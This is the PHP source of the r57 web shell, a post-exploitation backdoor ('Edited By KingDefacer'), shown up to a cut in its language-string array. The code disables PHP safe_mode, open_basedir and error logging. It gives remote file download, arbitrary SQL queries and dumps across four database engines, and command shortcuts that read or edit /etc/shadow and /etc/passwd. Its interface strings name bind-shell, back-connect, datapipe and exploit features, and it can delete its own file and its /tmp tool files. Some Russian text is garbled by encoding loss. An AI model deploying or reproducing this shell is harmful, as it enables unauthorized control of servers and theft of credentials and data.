<?

$language='eng';

$auth = 0;

$name='8cd59f852a590eb0565c98356ecb0b84';
$pass='8cd59f852a590eb0565c98356ecb0b84';

error_reporting(0);

@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

@ini_set('error_log',NULL);
@ini_set('log_errors',0);

if((!@function_exists('ini_get')) || (@ini_get('open_basedir')!=NULL) || (@ini_get('safe_mode_include_dir')!=NULL)){$open_basedir=1;} else{$open_basedir=0;};

define("starttime",@getmicrotime());
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
#if(@function_exists('ini_get')){$safe_mode = @ini_get('safe_mode');}else{$safe_mode=1;};
$version = '1.40';
if(@version_compare(@phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 $_COOKIE = &$HTTP_COOKIE_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_COOKIE as $k=>$v)
  {
  $_COOKIE[$k] = stripslashes($v);
  } 
 }

if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="HELLO!"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b>Access Denied</b>");
   }
}   
$head = '
<html>
<head>
<title>r57Shell Edited By KingDefacer</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
color: #000000;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
color: #000000;
}
.table1 {
BORDER: 0px;
BACKGROUND-COLOR: #D4D0C8;
color: #000000;
}
.td1 {
BORDER: 0px;
font: 7pt Verdana;
color: #000000;
}
.tr1 {
BORDER: 0px;
color: #000000;
}
table {
BORDER:  #eeeeee 1px outset;
BACKGROUND-COLOR: #D4D0C8;
color: #000000;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
color: #000000;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
color: #000000;;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
color: #000000;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;
color: #000000;
}
BODY {
margin: 1px;
color: #000000;
background-color: #e4e0d8;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}


</script>';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        } 
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    } 
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";            
        $fr   .= "\x00\x00";            
        $fr   .= "\x08\x00";            
        $fr   .= $hexdtime;             
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);             
        $fr      .= pack('V', $c_len);           
        $fr      .= pack('V', $unc_len);         
        $fr      .= pack('v', strlen($name));    
        $fr      .= pack('v', 0);                
        $fr      .= $name;
        $fr .= $zdata;
        $this -> datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";                
        $cdrec .= "\x14\x00";                
        $cdrec .= "\x00\x00";                
        $cdrec .= "\x08\x00";                
        $cdrec .= $hexdtime;                 
        $cdrec .= pack('V', $crc);           
        $cdrec .= pack('V', $c_len);         
        $cdrec .= pack('V', $unc_len);       
        $cdrec .= pack('v', strlen($name) ); 
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('V', 32 );            
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset += strlen($fr);
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('V', strlen($ctrldir)) .           
            pack('V', strlen($data)) .              
            "\x00\x00";              
    }
}

function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress')) 
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     } 
     else if ($compress == 'gzip' && @function_exists('gzencode')) 
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     } 
     else if ($compress == 'zip' && @function_exists('gzcompress')) 
     {
     $filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -> addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -> file();
     } 
     else 
     {
     $mime_type = 'application/octet-stream';
     }
 }

function moreread($temp){
global $lang,$language;
$str='';
  if(@function_exists('fopen')&&@function_exists('feof')&&@function_exists('fgets')&&@function_exists('fclose')){
   $ffile = @fopen($temp, "r");
   while(!@feof($ffile)){$str .= @fgets($ffile);}
   fclose($ffile);
  }elseif(@function_exists('fopen')&&@function_exists('fread')&&@function_exists('fclose')&&@function_exists('filesize')){
   $ffile = @fopen($temp, "r");
   $str = @fread($ffile, @filesize($temp));
   @fclose($ffile);
  }elseif(@function_exists('file')){
   $ffiles = @file ($temp);
   foreach ($ffiles as $ffile) { $str .= $ffile; }
  }elseif(@function_exists('file_get_contents')){
   $str = @file_get_contents($temp);
  }elseif(@function_exists('readfile')){
   $str = @readfile($temp);
  }else{echo $lang[$language.'_text56'];}
return $str;
}

function readzlib($filename,$temp=''){
global $lang,$language;
$str='';
  if(!$temp) {$temp=tempnam(@getcwd(), "copytemp");};
  if(@copy("compress.zlib://".$filename, $temp)) {
   $str = moreread($temp);
  } else echo $lang[$language.'_text119'];
  @unlink($temp);
return $str;
}

function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
class my_sql
 {
 var $host = 'localhost';
 var $port = '';
 var $user = '';
 var $pass = '';
 var $base = '';
 var $db   = '';
 var $connection;
 var $res;        
 var $error;      
 var $rows;       
 var $columns;     
 var $num_rows;   
 var $num_fields; 
 var $dump;       
 
 function connect()
  {   
  switch($this->db)
     {
   case 'MySQL': 
    if(empty($this->port)) { $this->port = '3306'; }
    if(!@function_exists('mysql_connect')) return 0;
    $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);
    if(is_resource($this->connection)) return 1;
   break;
     case 'MSSQL':
      if(empty($this->port)) { $this->port = '1433'; }
    if(!@function_exists('mssql_connect')) return 0;
    $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);
      if($this->connection) return 1;
     break;
     case 'PostgreSQL':
      if(empty($this->port)) { $this->port = '5432'; }
      $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";
      if(!@function_exists('pg_connect')) return 0;
      $this->connection = @pg_connect($str);
      if(is_resource($this->connection)) return 1;
     break;
     case 'Oracle':
      if(!@function_exists('ocilogon')) return 0;
      $this->connection = @ocilogon($this->user, $this->pass, $this->base);
      if(is_resource($this->connection)) return 1;
     break;
     }
    return 0;   
  }
  
 function select_db()
  {
   switch($this->db)
    {
  case 'MySQL':
   if(@mysql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'MSSQL':
   if(@mssql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'PostgreSQL':
     return 1;
    break;
    case 'Oracle':
     return 1;
    break;
    }
   return 0;  
  }
  
 function query($query)
  { 
   $this->res=$this->error='';
   switch($this->db)
    {
  case 'MySQL': 
     if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection))) 
      { 
      $this->error = @mysql_error($this->connection);
      return 0;
      } 
     else if(is_resource($this->res)) { return 1; }                   
     return 2;                                                          
  break;
    case 'MSSQL':
     if(false===($this->res=@mssql_query($query,$this->connection))) 
      {
      $this->error = 'Query error';
      return 0;
      }
      else if(@mssql_num_rows($this->res) > 0) { return 1; }
     return 2;     
    break;
    case 'PostgreSQL':
     if(false===($this->res=@pg_query($this->connection,$query)))
      {
      $this->error = @pg_last_error($this->connection);
      return 0;
      }
      else if(@pg_num_rows($this->res) > 0) { return 1; }
     return 2; 
    break;
    case 'Oracle':
     if(false===($this->res=@ociparse($this->connection,$query)))
      {
      $this->error = 'Query parse error';
      }
     else 
      { 
      if(@ociexecute($this->res)) 
       {
       if(@ocirowcount($this->res) != 0) return 2;
       return 1;
       }
      $error = @ocierror();
      $this->error=$error['message']; 
      }
    break;
    }
  return 0;
  }
 function get_result()
  { 
   $this->rows=array();
   $this->columns=array();
   $this->num_rows=$this->num_fields=0;
   switch($this->db)
    {
  case 'MySQL':
   $this->num_rows=@mysql_num_rows($this->res);
   $this->num_fields=@mysql_num_fields($this->res);
   while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res))); 
   @mysql_free_result($this->res);
   if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'MSSQL':
   $this->num_rows=@mssql_num_rows($this->res);
   $this->num_fields=@mssql_num_fields($this->res);    
   while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
   @mssql_free_result($this->res);
   if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;};
    break;
    case 'PostgreSQL':
   $this->num_rows=@pg_num_rows($this->res); 
   $this->num_fields=@pg_num_fields($this->res);   
   while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
   @pg_free_result($this->res);
   if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'Oracle':
     $this->num_fields=@ocinumcols($this->res);
     while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;
     @ocifreestatement($this->res);
     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    }
   return 0; 
  }
 function dump($table)
  { 
   if(empty($table)) return 0;
   $this->dump=array();
   $this->dump[0] = '##';
   $this->dump[1] = '## --------------------------------------- ';
   $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
   $this->dump[3] = '## Database: '.$this->base;
   $this->dump[4] = '##    Table: '.$table;
   $this->dump[5] = '## --------------------------------------- ';
   switch($this->db)
    {
  case 'MySQL':
   $this->dump[0] = '## MySQL dump';
   if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
   if(!$this->get_result()) return 0;
   $this->dump[] = $this->rows[0]['Create Table'];
     $this->dump[] = '## --------------------------------------- ';
   if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysql_real_escape_string($v);}
    $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    }
    break;
    case 'MSSQL':
     $this->dump[0] = '## MSSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
    $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    }
    break;
    case 'PostgreSQL':
     $this->dump[0] = '## PostgreSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);} 
    $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    } 
    break;
    case 'Oracle':
      $this->dump[0] = '## ORACLE dump';
      $this->dump[]  = '## under construction'; 
    break;
    default:
     return 0;
    break;
    }
   return 1; 
  }
 function close()
  { 
   switch($this->db)
    {
  case 'MySQL': 
   @mysql_close($this->connection); 
    break;
    case 'MSSQL':
     @mssql_close($this->connection);
    break;
    case 'PostgreSQL':
     @pg_close($this->connection);
    break;
    case 'Oracle':
     @oci_close($this->connection);
    break;
    }
  }
 function affected_rows()
  { 
   switch($this->db)
    {
  case 'MySQL':
   return @mysql_affected_rows($this->res); 
    break;
    case 'MSSQL':
     return @mssql_affected_rows($this->res);
    break;
    case 'PostgreSQL':
     return @pg_affected_rows($this->res);
    break;
    case 'Oracle':
     return @ocirowcount($this->res);
    break;
    default:
     return 0;
    break;
    }
  }
 } 
if(!empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if($file=@fopen($_POST['d_name'],"r")){ $filedump = @fread($file,@filesize($_POST['d_name'])); @fclose($file); }
  else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=""; }
  if(isset($_POST['cmd'])) 
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");   
    echo $filedump;
    exit();
   }
 }
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
if (!empty($_POST['cmd']) && $_POST['cmd']=="db_query")
 {
 echo $head;
 $sql = new my_sql();
 $sql->db   = $_POST['db'];
 $sql->host = $_POST['db_server'];
 $sql->port = $_POST['db_port'];
 $sql->user = $_POST['mysql_l'];
 $sql->pass = $_POST['mysql_p'];
 $sql->base = $_POST['mysql_db'];
 $querys = @explode(';',$_POST['db_query']);
 echo '<body bgcolor=#e4e0d8>';
 if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to SQL server</b></font></div>";
  else 
   {
   if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't select database</b></font></div>";
   else
    {
    foreach($querys as $num=>$query) 
     {
      if(strlen($query)>5)
      {
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>";
      switch($sql->query($query))
       {
       case '0':
       echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>";
       break;
       case '1': 
       if($sql->get_result())
        {
       echo "<table width=100%>";
        foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
       $keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;", $sql->columns);
        echo "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
        for($i=0;$i<$sql->num_rows;$i++)
         {
         foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
         $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]);
         echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
         }
        echo "</table>"; 
        }
       break;
       case '2':
       $ar = $sql->affected_rows()?($sql->affected_rows()):('0'); 
       echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>";
       break; 
       }
      }
     }
    }
   }   
 echo "<br><form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_server',0,$_POST['db_server']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center>";
 echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysql_db value=\"".$sql->base."\"></font><br>";
 echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; 
 echo "</form>";
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }
if(isset($_GET['delete']))
 {
   @unlink(__FILE__);
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
   @unlink("/tmp/prxpl");
   @unlink("/tmp/grep.txt");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }

if(isset($_GET['dmesg(8)']))
 {$_POST['cmd'] = 'dmesg(8)';}
if(isset($_GET['free']))
 {$_POST['cmd'] = 'free';}
if(isset($_GET['vmstat']))
 {$_POST['cmd'] = 'vmstat';}
if(isset($_GET['lspci']))
 {$_POST['cmd'] = 'lspci';}
if(isset($_GET['lsdev']))
 {$_POST['cmd'] = 'lsdev';}
if(isset($_GET['procinfo']))
 {$_POST['cmd']='cat /proc/cpuinfo';}
if(isset($_GET['version']))
 {$_POST['cmd']='cat /proc/version';}
if(isset($_GET['interrupts']))
 {$_POST['cmd']='cat /proc/interrupts';}
if(isset($_GET['realise1']))
 {$_POST['cmd'] = 'cat /etc/*realise';}
if(isset($_GET['service']))
 {$_POST['cmd'] = 'service --status-all';}
if(isset($_GET['ifconfig']))
 {$_POST['cmd'] = 'ifconfig';}
if(isset($_GET['w']))
 {$_POST['cmd'] = 'w';}
if(isset($_GET['who']))
 {$_POST['cmd'] = 'who';}
if(isset($_GET['uptime']))
 {$_POST['cmd'] = 'uptime';}
if(isset($_GET['last']))
 {$_POST['cmd'] = 'last -n 10';}
if(isset($_GET['psaux']))
 {$_POST['cmd'] = 'ps -aux';}
if(isset($_GET['netstat']))
 {$_POST['cmd'] = 'netstat -a';}
if(isset($_GET['lsattr']))
 {$_POST['cmd'] = 'lsattr -va';}
if(isset($_GET['syslog']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/syslog.conf';}
if(isset($_GET['fstab']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/fstab';}
if(isset($_GET['fdisk']))
 {$_POST['cmd'] = 'fdisk -l';}
if(isset($_GET['df']))
 {$_POST['cmd'] = 'df -h';}
if(isset($_GET['realise2']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/issue.net';}
if(isset($_GET['hosts']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/hosts';}
if(isset($_GET['resolv']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/resolv.conf';}
if(isset($_GET['systeminfo']))
 {$_POST['cmd'] = 'systeminfo';}
if(isset($_GET['shadow']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/shadow';}
if(isset($_GET['passwd']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/passwd';}
#if(isset($_GET['']))
# {$_POST['cmd'] = '';}

$lang=array(
'ru_text1' =>'Aыпол????а? ко?а??а',
'ru_text2' =>'Aыпол???и? ко?а?? ?а ???в???',
'ru_text3' =>'Aыпол?и?ь ко?а???',
'ru_text4' =>'?а?оча? ?и??к?о?и?',
'ru_text5' =>'Cа???зка файлов ?а ???в??',
'ru_text6' =>'Eокаль?ый файл',
'ru_text7' =>'Aлиа?ы',
'ru_text8' =>'Aы???и?? алиа?',
'ru_butt1' =>'Aыпол?и?ь',
'ru_butt2' =>'Cа???зи?ь',
'ru_text9' =>'I?к?ы?и? по??а и п?ив?зка ??о к /bin/bash',
'ru_text10'=>'I?к?ы?ь по??',
'ru_text11'=>'Iа?оль ?л? ?о???па',
'ru_butt3' =>'I?к?ы?ь',
'ru_text12'=>'back-connect',
'ru_text13'=>'IP-а????',
'ru_text14'=>'Iо??',
'ru_butt4' =>'Aыпол?и?ь',
'ru_text15'=>'Cа???зка файлов ? ??ал???о?о ???в??а',
'ru_text16'=>'E?пользова?ь',
'ru_text17'=>'??ал???ый файл',
'ru_text18'=>'Eокаль?ый файл',
'ru_text19'=>'Exploits',
'ru_text20'=>'E?пользова?ь',
'ru_text21'=>'?ово? и??',
'ru_text22'=>'datapipe',
'ru_text23'=>'Eокаль?ый по??',
'ru_text24'=>'??ал???ый ?о??',
'ru_text25'=>'??ал???ый по??',
'ru_text26'=>'E?пользова?ь',
'ru_butt5' =>'Cап???и?ь',
'ru_text28'=>'?а?о?а в safe_mode',
'ru_text29'=>'?о???п зап??щ??',
'ru_butt6' =>'????и?ь',
'ru_text30'=>'I?о??о?? файла',
'ru_butt7' =>'Aыв???и',
'ru_text31'=>'Oайл ?? ?ай???',
'ru_text32'=>'Aыпол???и? PHP ко?а',
'ru_text33'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir ч???з ф??к?ии cURL (PHP <= 4.4.2, 5.1.4)',
'ru_butt8' =>'I?ов??и?ь',
'ru_text34'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий safe_mode ч???з ф??к?и? include',
'ru_text35'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий safe_mode ч???з за???зк? файла в mysql',
'ru_text36'=>'?аза . ?а?ли?а',
'ru_text37'=>'Eо?и?',
'ru_text38'=>'Iа?оль',
'ru_text39'=>'?аза',
'ru_text40'=>'?а?п ?а?ли?ы ?азы ?а??ы?',
'ru_butt9' =>'?а?п',
'ru_text41'=>'?о??а?и?ь в файл?',
'ru_text42'=>'???ак?и?ова?и? файла',
'ru_text43'=>'???ак?и?ова?ь файл',
'ru_butt10'=>'?о??а?и?ь',
'ru_butt11'=>'???ак?и?ова?ь',
'ru_text44'=>'???ак?и?ова?и? файла ??воз?о??о! ?о???п ?олько ?л? ч???и?!',
'ru_text45'=>'Oайл ?о??а???',
'ru_text46'=>'I?о??о?? phpinfo()',
'ru_text47'=>'I?о??о?? ?а???о?к php.ini',
'ru_text48'=>'??ал??и? в??????ы? файлов',
'ru_text49'=>'??ал??и? ?к?ип?а ? ???в??а',
'ru_text50'=>'E?фо??а?и? о п?о????о??',
'ru_text51'=>'E?фо??а?и? о па???и',
'ru_text52'=>'??к?? ?л? пои?ка',
'ru_text53'=>'E?ка?ь в папк?',
'ru_text54'=>'Iои?к ??к??а в файла?',
'ru_butt12'=>'?ай?и',
'ru_text55'=>'?олько в файла?',
'ru_text56'=>'?ич??о ?? ?ай???о',
'ru_text57'=>'?оз?а?ь/??али?ь Oайл/?и??к?о?и?',
'ru_text58'=>'E??',
'ru_text59'=>'Oайл',
'ru_text60'=>'?и??к?о?и?',
'ru_butt13'=>'?оз?а?ь/??али?ь',
'ru_text61'=>'Oайл ?оз?а?',
